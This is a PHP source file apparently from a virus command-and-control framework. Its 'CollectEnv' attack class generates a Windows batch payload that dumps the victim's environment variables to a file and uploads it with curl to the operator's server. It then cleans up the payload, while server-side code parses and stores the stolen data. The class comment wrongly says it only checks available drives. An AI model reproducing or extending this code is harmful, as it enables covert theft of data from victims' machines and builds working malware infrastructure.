<?php /** @noinspection PhpUnused */

namespace Kelvinho\Virus\Attack\AttackPackages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\BaseScriptWin;

/**
 * Class CollectEnv
 * @package Kelvinho\Virus\Attack\AttackPackages
 *
 * This simply do a bunch of if exist "c:\" (echo true). Returns a string of the available drives.
 */
class CollectEnv extends AttackInterface {
    private array $data = [];

    public function __construct() {
    }

    public function setEnv(array $data): void {
        $this->data = $data;
    }

    public function getEnv(): array {
        return $this->data;
    }

    /**
     * This will generate the intercept code that will be used to take the reported data back from the virus.
     */
    //@formatter:off
    public function generateIntercept(): string {
        ob_start(); ?>
        use Kelvinho\Virus\Attack\AttackInterface;
        if (isset($_FILES["envFile"])) {
            $contents = file_get_contents($_FILES["envFile"]["tmp_name"]);
                $lines = \Kelvinho\Virus\filter(explode("\n", $contents), function ($line) {
                return !empty(trim($line));
            });
            $data = [];
            foreach ($lines as $line) {
            $contents = explode("=", $line);
            $data[$contents[0]] = explode(";", $contents[1]);
        }

        $attack = AttackInterface::get("<?php echo $this->attack_id; ?>");
        $attack->setEnv($data);
        $attack->setExecuted();
        $attack->saveState();
        }
        <?php return ob_get_clean();
    }
    //@formatter:on

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->data = $state["data"];
    }

    /**
     * This will get the state of an attack as a json string.
     *
     * @return string The JSON string
     */
    protected function getState(): string {
        //return "{\"data\": []}";
        $state = [];
        $state["data"] = $this->data;
        return json_encode($state);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl -X POST --form "envFile=@%~pd0env" <?php echo DOMAIN . "/viruses/$this->virus_id/attacks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    /**
     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
     *
     * @return string
     */
    //@formatter:off
    public function generateBatchCode(): string {
        ob_start(); ?>
        chCp 65001
        set > %~pd0env
        <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        return ob_get_clean();
    }
    //@formatter:on

    /**
     * This will include the correct admin page for this particular attack type.
     */
    public function includeAdminPage(): void {
        include(__DIR__ . "/admin.php");
    }

    /**
     * This will include the correct controller page for this particular attack type.
     */
    public function includeController(): void {
        include(__DIR__ . "/controller.php");
    }
}
